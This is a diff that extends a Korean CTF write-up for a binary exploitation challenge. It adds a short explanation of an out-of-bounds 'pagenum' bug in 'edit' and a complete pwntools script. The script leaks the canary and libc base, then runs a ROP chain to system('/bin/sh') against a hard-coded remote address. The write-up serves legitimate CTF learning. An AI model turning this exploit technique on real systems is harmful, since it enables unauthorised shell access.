@@ -255,4 +255,67 @@ LABEL_22:
 }
 ```
 
-`edit`에서 `pagenum`을 잘못 관리해서 4가 통과된다. 입출력이 모두 ㅇ
+`edit`에서 `pagenum`을 잘못 관리해서 4가 통과된다. 입출력이 모두 있으므로 `ROP` 해준다. 이게 250점이 아닌 게 신기하다.
+
+### ex.py
+
+```python
+from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'b *$rebase(0x150c)',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("15.165.12.135", 12345)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+l = ELF('./libc.so.6')
+
+def edit(idx : int, sz : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendlineafter(b': ', str(sz).encode())
+    p.sendafter(b': ', ctt)
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b': ', b'256')
+p.sendafter(b': ', b'a' * 0x100)
+
+edit(4, 9, b'a' * 9)
+p.sendlineafter(b'> ', b'2')
+p.recvuntil(b'Content: ' + b'a' * (0x100 + 9))
+canary = u64(b'\x00' + p.recvn(7))
+print(hex(canary))
+
+edit(4, 0x18, b'a' * 0x18)
+p.sendlineafter(b'> ', b'2')
+p.recvuntil(b'Content: ' + b'a' * (0x100 + 0x18))
+l.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x2a1ca
+print(hex(l.address))
+
+ret = l.address + 0x000000000002882f
+pop_rdi = l.address + 0x000000000010f75b
+system = l.sym['system']
+binsh = list(l.search(b'/bin/sh'))[0]
+edit(4, 0x18 + 0x20, b'a' * 0x8 + p64(canary) + b'a' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
+p.sendlineafter(b'> ', b'4')
+p.interactive()
+```
+
